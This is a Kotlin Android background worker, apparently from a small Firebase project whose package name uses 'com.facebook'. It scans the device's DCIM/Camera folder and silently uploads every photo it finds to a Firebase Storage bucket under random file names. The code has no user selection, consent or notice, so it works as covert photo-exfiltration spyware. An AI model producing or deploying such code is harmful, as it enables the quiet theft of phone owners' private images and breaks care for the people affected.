package com.facebook.firebase_project

// MyWorker.kt

import android.content.Context
import android.os.Environment
import android.util.Log
import android.webkit.MimeTypeMap
import android.widget.Toast
import androidx.core.net.toUri
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.ktx.storage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File
import java.util.UUID

class MyWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    val imageRef = Firebase.storage.reference
    override fun doWork(): Result {
            val root = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
            val cameraFolder = File(root, "Camera")

            if (cameraFolder.exists() && cameraFolder.isDirectory) {
                val imageFiles = getImageFiles(cameraFolder)

                if (imageFiles.isNotEmpty()) {
                    // Do something with the list of image files
                    for (imageFile in imageFiles) {
                        println("Image File: ${imageFile.name}")
                    }
                    Log.d("MainActivity",imageFiles.size.toString())
                    uploadImagesToStorage(imageFiles)
                } else {
                    Toast.makeText(applicationContext, "No image files found in Camera folder", Toast.LENGTH_SHORT).show()
                }
            } else {
                Toast.makeText(applicationContext ,"Camera folder does not exist or is not a directory", Toast.LENGTH_SHORT).show()
            }

        return Result.success()
    }
    private fun uploadImagesToStorage(imageFiles: ArrayList<File>) = CoroutineScope(Dispatchers.IO).launch {
        try {
            for (imageFile in imageFiles) {
                // Generate a unique filename for each image
                val filename = UUID.randomUUID().toString()

                imageRef.child("images/$filename").putFile(imageFile.toUri()).await()

                withContext(Dispatchers.Main) {
                    Log.d("MainActivity", "Successfully uploaded image: $filename")
                    // You can add additional logic here if needed
                }
            }
        } catch (e: Exception) {
            withContext(Dispatchers.Main) {
                Log.e("MainActivity", "Error uploading images: ${e.message}")
                // Handle the error if needed
            }
        }
    }
    private fun getImageFiles(folder: File): ArrayList<File> {
        val imageFiles = ArrayList<File>()
        val files = folder.listFiles()

        if (files != null) {
            for (file in files) {
                if (file.isFile && isImageFile(file)) {
                    imageFiles.add(file)
                }
            }
        }

        return imageFiles
    }
    private fun isImageFile(file: File): Boolean {
        val mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(file.extension.toLowerCase())
        return mimeType != null && mimeType.startsWith("image")
    }

}
